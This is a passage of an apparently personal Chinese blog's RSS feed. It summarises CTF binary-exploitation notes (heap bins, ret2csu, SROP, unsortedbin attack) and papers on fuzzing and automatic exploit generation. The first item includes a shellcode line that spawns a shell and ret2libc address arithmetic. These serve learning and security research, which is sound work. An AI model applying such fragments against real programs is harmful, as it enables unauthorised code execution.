知识点 [[静态链接栈溢出]] 如何将一个数转化为底层二进制的机器码，最简单的方式就是在IDA中直接看汇编 (80条消息) 堆漏洞挖掘中的bins分类(fastbin、unsorted bin、small bin、large bin)_arena bins_董哥的黑板报的博客-CSDN博客 fastbin 大小在32字节~128字节（0x20~0x80） unsorted bin 对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中 small bin 小于1024字节（0x400）的chunk large bin 大于等于1024字节（0x400）的chunk (80条消息) 堆漏洞挖掘中chunk的实际大小、最低大小、 mchunk_size成员_为什么申请的堆块大小会多加0x10_董哥的黑板报的博客-CSDN博客 当用户申请size大小的堆块时，在glibc中本质上是申请了size+16大小（64位系统中）的内存，因为要加上前两个成员 例如：malloc(0x10);申请了0x10大小的堆内存，本质上在glibc中申请了0x10+0x10=0x20大小的空间。 shellcode=asm(shellcraft.sh()) (68条消息) 堆中各个重要参数的意义（用于学习入门个人记录）_月阴荒的博客-CSDN博客 64 位记得用寄存器，32 位传参是在栈上 64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样 要懂得多试几个，这道题的 printf_got 用不了，那就换成 read 关于两种 libc libc_base = read_addr - libc.symbols[&amp;#34;read&amp;#34;] system_addr = libc_base + libc.symbols[&amp;#34;system&amp;#34;] str_bin_sh = libc_base + libc.</description>
    </item>
    
    <item>
      <title>ret2csu（以ciscn_2019_s_3为例子）</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/ret2csu%E4%BB%A5ciscn_2019_s_3%E4%B8%BA%E4%BE%8B%E5%AD%90/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/ret2csu%E4%BB%A5ciscn_2019_s_3%E4%B8%BA%E4%BE%8B%E5%AD%90/</guid>
      <description>参考：(67条消息) 中级ROP之ret2csu_西杭的博客-CSDN博客
适用场景 在我们想要调用系统调用，或者在 64 位程序中通过寄存器传递参数，需要设置寄存器中的值，但是有的时候可能没有搜到足够 gadgets 来对寄存器设置值。这个时候需要 csu 函数。
概述 __libc_csu_init 函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们可以构造栈的分布，然后控制程序跳转到 csu，将寄存器的值设置为所需要的值。
原理 __libc_csu_init 函数的汇编指令 .text:00000000004011B0 ; void _libc_csu_init(void) .text:00000000004011B0 public __libc_csu_init .text:00000000004011B0 __libc_csu_init proc near ; DATA XREF: _start+16↑o .text:00000000004011B0 ; __unwind { .text:00000000004011B0 push r15 .text:00000000004011B2 mov r15, rdx .text:00000000004011B5 push r14 .text:00000000004011B7 mov r14, rsi .text:00000000004011BA push r13 .text:00000000004011BC mov r13d, edi .text:00000000004011BF push r12 .text:00000000004011C1 lea r12, __frame_dummy_init_array_entry .text:00000000004011C8 push rbp .</description>
    </item>
    
    <item>
      <title>Revery from Proof-of-Concept to Exploitable</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/revery-from-proof-of-concept-to-exploitable/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/revery-from-proof-of-concept-to-exploitable/</guid>
      <description>中文译名：revery: 从概念验证到可利用 作者：Yan Wang 单位：IIE 国家： #中国 年份： #2018年 来源： #ccs 关键字： #AGE #fuzzing 代码地址： 笔记建立时间： 2023-05-17 14:32 #TODO
ABSTRACT exploitable states do not always exist in crashing paths existing solutions heavily rely on symbolic execution and not scalable in path exploration and exploit generation few solutions could exploit heap-based vulnerabilities Revery can search exploitable statess in paths divering from crashing paths and generate control-flow hijacking exploits for heap-based vulnerabilities. a layout-contributor digraph 目的： 方法： 意义： 效果：</description>
    </item>
    
    <item>
      <title>Semantic-Informed Driver Fuzzing Without Both the Hardware Devices and the Emulators</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/semantic-informed-driver-fuzzing-without-both-the-hardware-devices-and-the-emulators/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/semantic-informed-driver-fuzzing-without-both-the-hardware-devices-and-the-emulators/</guid>
      <description>中文译名：不需要硬件设备和模拟器的语义驱动模糊 作者：Wenjia Zhao 单位：西安交通大学 国家： #中国 年份： #2022年 来源： #NDSS会议 关键字： #fuzzing #仿真托管 代码地址：secsysresearch/DRFuzz (github.com) 笔记建立时间： 2023-03-13 10:24
摘要 背景：
驱动接收来自用户空间或硬件的复杂且不可信的输入 驱动代码本身不可靠，开发开发人员经验少，开发结束后难测试 目的：构建不需要设备的驱动 fuzzing 系统 方法：
通过 semantic-informed 机制可以高效生成可以通过验证链的输入，所以不需要硬件设备了 推断合法的输入值 推断输入字节的时间使用顺序来缩小变异空间 使用错误状态作为反馈来指导 fuzzing 通过验证链 semantic-informed 机制是通用的 可以生成半畸形输入来提高覆盖率 效果：在 214 个 Linux 驱动程序上评估 DR. FUZZ。在 24 小时的时间预算下，DR. FUZZ 可以在没有相应设备的情况下成功初始化和启用大多数驱动程序，而现有的 fuzzer 如 syzkaller 在任何情况下都无法成功。DR. FUZZ 在其他方面也明显优于现有的甚至配备了设备或模拟器的驱动程序模糊器: 它将代码覆盖率提高了 70%，吞吐量提高了 18%。通过 DR. FUZZ，我们还在这些 Linux 驱动程序中发现了 46 个新错误。
1引言 背景：驱动程序关键且脆弱 现状：当前的驱动 fuzzing 都需要硬件或者模拟器
硬件难搞 模拟器支持的不多 即使有硬件或者模拟器，但是生成的输入不够畸形，难以触发漏洞 方法：</description>
    </item>
    
    <item>
      <title>SemFuzz Semantics-based Automatic Generation of Proof-of-Concept Exploits</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/semfuzz-semantics-based-automatic-generation-of-proof-of-concept-exploits/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/semfuzz-semantics-based-automatic-generation-of-proof-of-concept-exploits/</guid>
      <description>中文译名：SemFuzz:基于语义的概念验证漏洞自动生成 作者：wei you btw 二作和三作是 IIE，三作是陈凯 单位：印第安纳大学伯明顿分校 国家： #美国 年份： #2017年 来源： #ccs
关键字： #fuzzing #定向fuzzing #generate_poc 代码地址： 笔记建立时间： 2023-04-10 09:47
摘要 提出 semfuzz，利用漏洞相关文本（例如，CVE 报告和 Linux git 日志）来指导 PoC 的自动生成 基于 NLP 来进行信息提取 基于语义的模糊处理来生成 PoC SemFuzz 运行了过去五年报告的112个 Linux 内核缺陷，成功触发了其中的18个，并进一步发现了一个零日漏洞和一个未公开的漏洞。 怎么感觉成功触发的有点少啊
Instruction 漏洞的 CVE 报告，Linux git 日志、论坛和博客上发布的错误描述都可以用来帮助自动生成 PoC
从攻击方角度来说如何去利用这些信息 从防守方角度来说，如何控制这些信息的泄露 自动生成 exploit 的挑战 自动生成 exp 很困难，目前能够实现的都是针对一些简单的输入验证类的漏洞。其他类型的漏洞 (如不受控制的资源消耗、死锁、内存损坏等)的 exp 自动生成过于复杂，目前（2017 年前）还没人做。 目前的方法主要就是符号执行找到约束，求解约束 但是就算是简单的输入验证类漏洞，符号执行和约束求解也是困难的。因为现实世界的程序的漏洞的路径约束往往是非线性的，增大了求解难度 本文方法 利用与漏洞相关的非代码文本，特别是 CVE 报告和 Linux git 日志，来提取指南，这些指南被认为是有助于发现和触发一组深层错误的信息。 本文的技术是基于语义的模糊测试，自动分析错误报告，以在 Linux 内核漏洞上创建端到端的 PoC 首先利用 NLP 来分析 CVE 和 git 日志，利用这些信息来创建一个到达漏洞函数的调用序列 利用模糊测试迭代的调整各个调用的参数，以移动到函数内部的修补代码，直到触发漏洞。（我的理解就是被测程序实际上是没有这个修补代码的，已修补的程序修补代码的位置就是未修补程序漏洞的位置） SemFuzz 能够处理内核代码中的各种漏洞 DESIGN OVERVIEW SemFUZZ 主要是两个步骤：</description>
    </item>
    
    <item>
      <title>SemFuzz 总结笔记</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/semfuzz-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/semfuzz-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/</guid>
      <description>information source common vulnerabilities and exposures (CVE) systems CVE - CVE (mitre.org) Linux git logs CVE - CVE (mitre.org) bug descriptions posted on forums and blogs SEMANTIC INFORMATION RETRIEVING NLP tool process these information, output calling sequence. so, fuzzer utilizes the sequences to guidline the fuzz this part i want know how the fuzzer use these sequences, how two prune the unreachable path I noticed that the example both have cve report and git log Generating parse tree: the tool is pyStatParser，author use it to generate the syntax tree Retrieving affected version: basically, match through regular expressions Retrieving vulnerability type: from the 70 types of Linux kernel related CWEs, author choosed 16 types as the default type of semfuzz and semfuzz identified through the parse tree.</description>
    </item>
    
    <item>
      <title>SFuzz Slice-based Fuzzing for Real-Time Operating Systems</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/sfuzz-slice-based-fuzzing-for-real-time-operating-systems/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/sfuzz-slice-based-fuzzing-for-real-time-operating-systems/</guid>
      <description>基于SFuzz切片的实时操作系统模糊
Abstract 背景：嵌入式系统大多是实时操作系统。
问题：RTOS的单体设计将各种任务和服务结合成一个单一的二进制文件，这阻碍了目前在RTOS系统上的程序测试和分析技术。
目的：提出了SFuzz，一种新型的基于切片的模糊器，用于检测RTOS系统的安全漏洞。作者认为RTOS通常将一个复杂的二进制文件划分为许多分离但一心一意的任务。每个任务以确定的方式完成一个特定的事件，其控制流通常是直接和独立的。因此，作者从单一的RTOS二进制文件中识别出这样的代码，并合成一个切片进行有效的测试。
方法：SFuzz首先识别处理用户输入的函数，构建从这些函数的调用者开始的调用图，并利用前向切片来构建基于调用图的执行树，并修剪独立于外部输入的路径。然后，它检测粗粒度范围内阻碍有效模糊处理的路障，如与用户输入无关的指令。然后，它在这些代码片段上进行覆盖率引导的模糊处理。最后，SFuzz利用前向和后向切片来跟踪和验证每个路径约束，并确定在模糊器中发现的错误是否是真正的漏洞。
理解：貌似作者首先从用户输入的函数开始构建调用图，然后基于调用图利用前向切片构建执行树，
INTRODUCTION 传统静态分析的挑战：单体RTOS二进制的大尺寸（路径爆炸）、难识别函数语义、无正确和稳定的仿真环境
现状：要么只在特定的设备上工作，要么依赖真实的设备，要么检测有限的错误类型，要么需要人工分析和领域知识，总的来说，在RTOS中缺乏一种灵活和通用的方法来有效地发现漏洞。
方法：因为RTOS通常将一个应用划分为许多分离的子任务，每个子任务的控制流都是独立的，它们的数据流或许会有类似的模式。所以首先寻找相同的数据流，然后定位对应函数，然后切片代码，对得到的切片代码进行模糊测试。“这些切片足够小，可以使用现有的模糊逻辑进行测试。此外，它们提出了更小但更关键的控制流范围。它可以大大缓解仿真难度和分析复杂性，这将使我们能够进行更有效和高效的测试，如灰盒模糊和符号执行。”
SFuzz：四个主要部分
正向切片机：定义启发式方法来定位函数，然后构造调用图，在调用图中进行前向切片。 控制流节点处理程序：使用控制流节点处理程序来给模糊器补充运行状态和运行上下文，指导模糊器确定如何处理与用户输入无关的函数调用和条件分支，这可以帮助模糊引擎提高路径探索的效率和稳定性。 微观模糊处理：我们的模糊引擎专注于修剪后的执行树中的指令。从输入源开始，它通过指令级仿真更新执行环境。该引擎将执行与输入相关的代码片段，并忽略大量不必要的路径，包括其他输入处理程序。为了检查危险的行为，它监测汇合点函数调用的上下文，并在上下文违反预定的安全策略时报告潜在的错误。 符号执行分析：对函数进行后向切片，然后从切片末尾进行符号执行，目的是补充上面修建而遗失的信息，最后实现一个完整而准确的路径条件来评估一个漏洞，从而过滤由于探索修剪和上下文缺失造成的假阳性结果。 PROBLEM AND APPROACH OVERVIEW RTOS and Embedded Devices 具有所有功能的单二进制 剥离了符号系统以减小文件大小 Motivation Example 举了个例子说明RTOS难分析
Necessity and Reasonability of SFuzz 切片操作的优势：可以忽略模拟各种硬件和服务功能的困难，缓解符号执行的缓解路径爆炸问题 使用实例验证切片操作的正确性 Challenges of Slice-based Fuzzing 如何确定片段的范围？ 如何处理片段中与控制流有关的点？ 如何有效地进行基于切片的模糊处理和验证PoC？ DESIGN 前向切片机将调用图分析与前向污点分析相结合，以确定基于切片的模糊处理的每个任务的探索空间；控制流节点处理程序用于帮助后续的模糊处理部分跳过不必要的路径探索，这些节点会使模糊处理阶段卡住；微模糊引擎是一个混合灰盒模糊器，它结合了一些低级技术，如错误检测策略，使模糊器能够顺利运行并发现错误,Concolic分析器主要是为了帮助我们过滤由于探索修剪和上下文缺失造成的假阳性结果。
Forward Slicer 步骤概述：首先恢复固件中关键功能的语义，以定位外部数据入口点，然后利用前向切片模块输出与处理外部输入和全局数据有关的执行树。
三部分：
敏感调用图构造器 目的：检测输入获取函数和全局数据读取点，作为根节点 方法：没说 调用图修剪 目的：进一步修剪独立于外部输入的子图或路径 方法：利用轻量级(粗粒度)污染分析技术来跟踪调用图中的每个路径，确定外部输入和全局数据的影响范围，范围外的路径被修剪 调用图形拼接： 目的：在不同调用图的节点之间拼接一些边 方法：静态动态分析来识别相关节点，还有基于常量字符串进行搜索和匹配相关节点来拼接。 Control Flow Nodes Handler 控制流节点处理程序可以基于调用图构建目标代码段的执行树。但是为了使执行树上的模糊测试工作顺利进行，避免不必要的路径探索，需要处理与控制流相关的几种指令，换句话说需要策略来指导模糊器确定如何处理代码片段中的函数调用，并选择要跳转的条件语句的哪个分支。
Micro Fuzzing 作为模糊引擎的核心，我们将基于切片的模糊技术称为微模糊。它接受代码片段作为输入，探索执行树中的路径，并忽略不相关的调用站点和其他输入数据处理程序。引擎同时检查接收器函数调用站点的上下文，并在根据预定义的策略进行内存访问时导出崩溃输入。
镜像加载器：对切片代码进行预处理，插入跳转和结束指令，用于忽略不相关的调用站点和其他输入数据处理程序。 fuzz引擎：基于UnicornAFL，当调用核心引擎时，它加载RTOS系统，并从它的开始(执行树的根节点)重复执行目标代码片段。该引擎将在输入入口点生成随机数据。当核心模糊引擎卡住时，利用符号执行组件来引导模糊器沿着未探索的路径测试。 内存安全策略。这块没懂 Concolic Analyzer 目的是检测上面模糊测试得到漏洞是不是真的漏洞，因为修剪操作可能会产生假阳性漏洞。</description>
    </item>
    
    <item>
      <title>SROP</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/</guid>
      <description>SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制
signal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context.</description>
    </item>
    
    <item>
      <title>The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/the-progress-challenges-and-perspectives-of-directed-greybox-fuzzing/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/the-progress-challenges-and-perspectives-of-directed-greybox-fuzzing/</guid>
      <description>定向灰盒模糊技术的进展、挑战与展望 作者：王鹏飞 单位：国防科技大学 国家： #中国 年份： #2021年 来源： #arxiv 关键字： #定向fuzzing #综述 总结笔记：[[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing 总结笔记]] [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing.pdf]]
PUT program under test DSE directed symbolic execution 定向符号执行 Abstract 定向灰盒相对于普通灰盒测试更高效 定向灰盒适用于补丁测试，bug再现，特殊bug检测等场景 本文从更广泛的角度研究DGF，它不仅考虑了针对特定代码部分的位置导向类型，而且还考虑了旨在暴露异常程序行为的行为导向类型。通过分析DGF研究的好处和局限性，我们试图找出当前研究中的差距，同时，揭示新的研究机会，并提出进一步调查的领域。 Introuction Greybox fuzzing is widely used to test application software and libraries [5, 6], as well as kernel code [7–9] and protocols[10-12]. testing software by blindly extending code coverage is less e fficient Originally, directed fuzzers were based on symbolic execution[14-17].</description>
    </item>
    
    <item>
      <title>The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing 总结笔记</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/the-progress-challenges-and-perspectives-of-directed-greybox-fuzzing-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/the-progress-challenges-and-perspectives-of-directed-greybox-fuzzing-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/</guid>
      <description>具体内容可看 [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing]]
术语缩写 ： PUT program under test DSE directed symbolic execution 定向符号执行 DGF 现在的一些研究方向（内容）： 设计新的 fitness 距离 相似度（比距离有优势）![[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing#^dfb282]] 脆弱性预测模型（脆弱概率）（目前精度不高） 实现多维度的 fitness 协调（感觉这个是比较好做的方向，堆料就行） 使用启发式算法来处理能量分配（本质上是在做优化，AFLgo 里面的模拟退火） Targets 预测 可以从代码位置和程序行为两方面入手 生成合法输入、或者过滤无效输入 动态污点分析 语义信息 深度学习 静态分析 变异策略 符号执行解决复杂约束 检测 bug 类型 前四项应该是属于 DGF 的特定任务，1-2 希望得到更有效的 fitness，3 希望能优化 fitness 的计算算法，第四项其实和 fitness 密切相关，往往 fitness 就是 targets 确定方法的一个量化。 而后几项感觉算是 fuzzing 研究通用的问题，主要是用来优化 fuzzing，提高 fuzzing 的效率 挑战 Fuzzing 性能下降，因为 DGF 有一些额外的处理 预处理 并行计算 提前过滤无效输入 轻量级算法 更加细粒度的调控 等加权指标偏差种子优先级 [[The Progress, Challenges, and Perspectives of Directed Greybox Fuzzing#Equal-weighted Metrics Bias Seed Prioritization 等加权指标偏差种子优先级]] 基于距离的度量的全局最优差异 勘探阶段和开发阶段的不灵活协调（EcoFuzz 解决了该问题） 过于依赖源代码（或者说二进制层次上的测试难以开展） 硬件辅助模拟 机器学习和启发式二进制差分法来识别 targets 应用 patch testing bug reproduction knowledge integration result validation energy saving dgf 的另一个有趣的应用是在测试资源有限的情况下。例如，当模糊物联网设备。在这种情况下，识别关键代码区域来指导测试比以无导向的方式测试整个程序更有效，这可以节省时间和计算资源花在没有 bug 的代码区域上。GREYHOUND[12]和 RVFUZZER[33]分别为 Wi-Fi 客户端和机器人车辆设计，均适用于此场景。 Special bug detection.</description>
    </item>
    
    <item>
      <title>Towards the Detection of Inconsistencies in Public Security Vulnerability Reports</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/towards-the-detection-of-inconsistencies-in-public-security-vulnerability-reports/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/towards-the-detection-of-inconsistencies-in-public-security-vulnerability-reports/</guid>
      <description>中文译名：浅谈公共安全漏洞报告不一致的检测 作者：Ying Dong 单位： 国科大 国家： #中国 年份： #2019年 来源： #USENIX会议 关键字： #提取信息 代码地址：pinkymm/inconsistency_detection: Towards the Detection of Inconsistencies in Public Security Vulnerability Reports (github.com) 笔记建立时间： 2023-05-15 14:53
Abstract we propose an automated system VIEM to detect inconsistent information between the fully standardized NVD database and the unstructured CVE descriptions and their referenced vulnerability reports. VIEM is developed to extract vulnerable software names and vulnerable versions from unstructured text. We introduce customized designs to deep-learning-based named entity recognition (NER) and relation extraction (RE) so that VIEM can recognize previous unseen software names and versions based on sentence structure and contexts.</description>
    </item>
    
    <item>
      <title>unsortedbin attack</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/unsortedbin-attack/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/unsortedbin-attack/</guid>
      <description>(72条消息) 堆漏洞挖掘——unsortedbin attack漏洞_unsorted bin attack_董哥的黑板报的博客-CSDN博客 ubsortedbin attack是用来配合 [[fastbin attack]] 的。 ubsortedbin attack是双向链表，所以系统会将我们伪造的fake chunk的fd和bk都指回unsortedbin链，而这个地址肯定是0x7f开头的大数值，所以就在目标地址处写入了0x7f。</description>
    </item>
    
    <item>
      <title>What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/what-you-corrupt-is-not-what-you-crash-challenges-in-fuzzing-embedded-devices/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/what-you-corrupt-is-not-what-you-crash-challenges-in-fuzzing-embedded-devices/</guid>
      <description>你破坏的不是你破坏的: Fuzzing 嵌入式设备的挑战 作者：Marius Muench 单位：巴黎高等电信学院 国家： #法国 年份： #2018年 来源： #NDSS会议 关键字： #嵌入式 #综述 [[What You Corrupt Is Not What You Crash_ Challenges in Fuzzing Embedded Devices.pdf]]
Abstract 传统的测试方法依赖于程序中看的见的崩溃, 而二进制插装技术是用来改善针对这些缺陷状态的检测方法 演示了 memory corruption 漏洞，展示 embedded devices 和 desktop systems 的不同 分析了几种 embedded devices 设备的差异 Introduction Memory corruption 导致的漏洞普遍存在，模糊测试是发现这些漏洞最流行的技术之一，适合大规模自动化 因为 embedded devices 的有限的 I/O 和计算能力，受限的成本，其上没有大部分 desktop systems 拥有的防御机制，所以发生内存损坏的概率更高 但是 embedded devices 存在缺少源码，识别 memory corruption 的传统方法不适用于的问题。 本文首次全面分析了内存损坏对不同类别的嵌入式系统的影响，并且提出的技术可以 100%检测到在模糊过程中触发的内存损坏状态 FUZZING EMBEDDED SYSTEMS 首先介绍将在本文其余部分使用的嵌入式系统的分类。然后，我们讨论了之前将模糊测试应用于不同嵌入式设备的实验，最后我们提出了在该领域应用模糊测试所遇到的挑战。</description>
    </item>
    
    <item>
      <title>What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices 总结笔记</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/what-you-corrupt-is-not-what-you-crash-challenges-in-fuzzing-embedded-devices-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/what-you-corrupt-is-not-what-you-crash-challenges-in-fuzzing-embedded-devices-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/</guid>
      <description>[[What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices]] 参考：浅谈固件Fuzz_黑客技术 (hackdig.com)
嵌入式设备分类 基于 Linux OS 的嵌入式设备：对于初次接触固件漏洞挖掘的读者往往接触的都是这类嵌入式设备，如大部分的摄像头、路由器。 自定义操作系统的嵌入式设备：可能不存在内存管理单元(MMU)，不过内核和用户层仍然存在逻辑分离。 没有抽象操作系统的嵌入式设备：编译后的代码系统空间和用户空间是混在一起的，不存在内核与用户层的逻辑分离。 参考的博客给出了这样一个观点：对这种类型的设备进行 fuzz 似乎本来就比较少见，因为该种类型的设备代码量一般较小，只用逆向说不定都可以还原。 对嵌入式设备 fuzz 的难点 错误检测：嵌入式设备的防御机制少，即使触发了漏洞，但是系统没有崩溃，fuzz 器就得不到反馈，就以为没有触发漏洞。 性能和可扩展性：难以并行，每轮都要重启设备 插桩 后续作者针对错误检测这一个问题，将嵌入式设备分为三类进行测试，将它们的反应分为了 6 种情况。![[What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices#Observed Behavior]]
启发式方法加强错误检测 段追踪 格式说明符跟踪 堆对象追踪 调用栈追踪 调用帧追踪 栈对象追踪 针对嵌入式设备 fuzz 问题的一些方法 （作者原文中对每种方法都给出了需要的工具和资源）
静态插桩 二进制重写 物理重托管 全仿真 部分仿真 硬件支持的插桩 启示 这篇文章的主要工作在于两部分
针对嵌入式设备缺乏错误检测机制的实验论证和解决方案 嵌入式设备 fuzzing 的现状综述 我觉得第一部分就是这篇文章的亮点，切入点很好。其次这篇文章相对于其他开发一套 fuzz 框架，或者提出某种方法的论文学术意味更强，因为工作量主要在实验上，文章最后的启发式发方法更像是展望，而不是一个具体的成果。所以说即使没有一个很好的解决方法，但是提出了问题并且证明了问题的存在也可以写一篇很好的文章。</description>
    </item>
    
    <item>
      <title>前缀和（前缀和矩阵）</title>
